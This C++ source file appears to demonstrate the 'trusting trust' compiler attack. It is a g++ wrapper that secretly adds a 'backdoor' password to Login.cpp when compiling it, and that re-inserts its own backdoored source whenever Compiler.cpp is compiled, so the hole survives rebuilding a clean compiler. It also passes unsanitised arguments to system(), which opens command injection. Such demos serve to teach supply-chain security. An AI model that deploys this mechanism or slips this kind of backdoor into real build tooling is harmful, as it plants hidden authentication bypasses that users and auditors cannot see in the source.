using namespace std;
#include <string>
#include <cstdlib> 
#include <regex>
#include <fstream>
#include <sstream>

// This searches the file and replaces all occurrences of regexPattern with `newText`
void findAndReplace(string fileName, string regexPattern, string newText) {
    ifstream fileInputStream(fileName);
    stringstream fileContents;
    fileContents << fileInputStream.rdbuf();
    string modifiedSource = regex_replace(fileContents.str(), regex(regexPattern), newText);
    ofstream fileOutputStream(fileName);
    fileOutputStream << modifiedSource;
    fileOutputStream.close();
}

void compileLoginWithBackdoor(string allArgs) {
    system("cat Login.cpp > LoginWithBackdoor.cpp");
	findAndReplace(
        "LoginWithBackdoor.cpp",
        "enteredPassword == \"test123\"",
        "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
    );
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
	system(modifiedCommand.c_str());
	remove("LoginWithBackdoor.cpp");
}

void compileCleanCompilerWithBackdoor(string allArgs) {
    system("cat Compiler.cpp > CompilerWithBackdoor.cpp");
    string evilCompilerSourceCode = " \n\
        using namespace std; \n\
        #include <string> \n\
        #include <cstdlib> \n\
        #include <regex> \n\
        #include <fstream> \n\
        #include <sstream> \n\
                            \n\
        void findAndReplace(string fileName, string oldText, string newText) { \n\
            ifstream fileInputStream(fileName); \n\
            stringstream fileContents; \n\
            fileContents << fileInputStream.rdbuf(); \n\
            string modifiedSource = regex_replace(fileContents.str(), regex(oldText), newText); \n\
            ofstream fileOutputStream(fileName); \n\
            fileOutputStream << modifiedSource; \n\
        } \n\
                                                        \n\
        void compileLoginWithBackdoor(string allArgs) {    \n\
            system(\"cat Login.cpp > LoginWithBackdoor.cpp\"); \n\
            findAndReplace( \n\
                \"LoginWithBackdoor.cpp\", \n\
                \"enteredPassword == \\\"test123\\\"\", \n\
                \"enteredPassword == \\\"test123\\\" || enteredPassword == \\\"backdoor\\\"\" \n\
            ); \n\
            string modifiedCommand = \"g++ \" + regex_replace(allArgs, regex(\"Login.cpp\"), \"LoginWithBackdoor.cpp\"); \n\
            system(modifiedCommand.c_str()); \n\
            remove(\"LoginWithBackdoor.cpp\"); \n\
        } \n\
                                            \n\
        int main(int argc, char *argv[]) { \n\
            string allArgs = \"\"; \n\
            for(int i=1; i<argc; i++) \n\
                allArgs += \" \" + string(argv[i]); \n\
            string shellCommand = \"g++\" + allArgs; \n\
            string fileName = string(argv[1]); \n\
            if(fileName == \"Login.cpp\") { \n\
                compileLoginWithBackdoor(allArgs); \n\
            } else { \n\
                system(shellCommand.c_str()); \n\
            } \n\
        } \n\
    ";
    ofstream fileOutputStream("CompilerWithBackdoor.cpp"); 
    fileOutputStream << evilCompilerSourceCode;
    fileOutputStream.close(); 
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Compiler.cpp"), "CompilerWithBackdoor.cpp");
    system(modifiedCommand.c_str());
    remove("CompilerWithBackdoor.cpp");
}

int main(int argc, char *argv[]) {
	string allArgs = "";
    for(int i=1; i<argc; i++)
        allArgs += " " + string(argv[i]);
    string shellCommand = "g++" + allArgs;
    string fileName = string(argv[1]);
    if(fileName == "Compiler.cpp")
        compileCleanCompilerWithBackdoor(allArgs);
    else if(fileName == "Login.cpp")
        compileLoginWithBackdoor(allArgs);
    else
	    system(shellCommand.c_str());
}